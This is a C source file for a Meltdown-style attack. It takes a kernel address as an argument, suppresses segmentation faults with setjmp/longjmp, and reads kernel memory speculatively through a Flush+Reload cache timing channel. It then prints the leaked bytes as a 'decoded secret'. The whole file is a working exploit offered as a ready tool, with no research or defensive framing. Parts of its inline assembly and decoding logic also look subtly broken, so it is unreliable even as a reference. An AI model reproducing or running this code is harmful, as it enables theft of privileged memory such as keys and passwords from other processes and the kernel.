#include <stdio.h>
#include <stdint.h>
#include <signal.h>
#include <setjmp.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>
#include <unistd.h>

#define PAGE_SIZE 4096
#define ARRAY_SIZE 256
#define CACHE_HIT_THRESHOLD 150 // Adjust if necessary

// Globals
static jmp_buf buf;         // Buffer for exception handling
uint8_t *probe_buffer;      // Probe buffer for Flush+Reload

// Signal handler to suppress segmentation faults
void segfault_handler(int signum) {
    (void)signum;
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, SIGSEGV);
    sigprocmask(SIG_UNBLOCK, &sigs, NULL); // Unblock SIGSEGV
    longjmp(buf, 1); // Recover from segmentation fault
}

// Flush a memory address from the cache
void flush(const uint8_t *addr) {
    _mm_clflush(addr);
}

// Measure access time to a memory address
uint64_t measure_access_time(const uint8_t *addr) {
    uint64_t start, end;
    _mm_lfence();
    start = __rdtsc();
    (void)*addr;
    _mm_lfence();
    end = __rdtsc();
    return end - start;
}

// Decode one byte using speculative execution
uint8_t read_byte(size_t kernel_addr) {
    uint64_t access_times[ARRAY_SIZE];
    int min_time_index = -1;

    // Flush the probe buffer
    for (int i = 0; i < ARRAY_SIZE; i++) {
        flush(&probe_buffer[i * PAGE_SIZE]);
    }

    // Suppress segmentation faults
    if (setjmp(buf) == 0) {
        printf("[INFO] Attempting speculative access at address: 0x%zx\n", kernel_addr);
        __asm__ volatile (
            "1:\n"
            "movzx (%[addr]), %%rax\n"     // Read from kernel memory
            "shl $12, %%rax\n"             // Multiply by PAGE_SIZE
            "movq (%[probe], %%rax, 1), %%rbx\n" // Access the probe buffer
            "jz 1b\n"
            :
            : [addr] "r" (kernel_addr), [probe] "r" (probe_buffer)
            : "rax", "rbx"
        );
    } else {
        printf("[ERROR] Segmentation fault suppressed for address: 0x%zx\n", kernel_addr);
        return 0; // Return 0 if a segmentation fault occurs
    }

    // Measure access times for each page in the probe buffer
    for (int i = 0; i < ARRAY_SIZE; i++) {
        access_times[i] = measure_access_time(&probe_buffer[i * PAGE_SIZE]);
    }

    // Find the index of the cache hit
    uint64_t min_time = CACHE_HIT_THRESHOLD;
    for (int i = 0; i < ARRAY_SIZE; i++) {
        if (access_times[i] < min_time) {
            min_time = access_times[i];
            min_time_index = i;
        }
    }

    return (uint8_t)min_time_index;
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <kernel_address>\n", argv[0]);
        return EXIT_FAILURE;
    }

    // Parse the kernel address from the command-line arguments
    size_t kernel_addr = strtoull(argv[1], NULL, 0);

    // Allocate the probe buffer
    probe_buffer = aligned_alloc(PAGE_SIZE, ARRAY_SIZE * PAGE_SIZE);
    if (!probe_buffer) {
        perror("Failed to allocate probe buffer");
        return EXIT_FAILURE;
    }
    memset(probe_buffer, 0, ARRAY_SIZE * PAGE_SIZE);

    // Set up the segmentation fault handler
    if (signal(SIGSEGV, segfault_handler) == SIG_ERR) {
        perror("Failed to set signal handler");
        free(probe_buffer);
        return EXIT_FAILURE;
    }

    // Read and decode the secret byte-by-byte
    printf("[INFO] Reading from kernel address: 0x%zx\n", kernel_addr);
    printf("[INFO] Decoded secret: ");
    for (size_t offset = 0; offset < 64; offset++) { // Read up to 64 bytes
        uint8_t byte = read_byte(kernel_addr + offset);
        if (byte == 0) break; // Stop at null terminator
        printf("%c", byte);
        fflush(stdout);
    }
    printf("\n");

    // Clean up
    free(probe_buffer);
    return EXIT_SUCCESS;
}
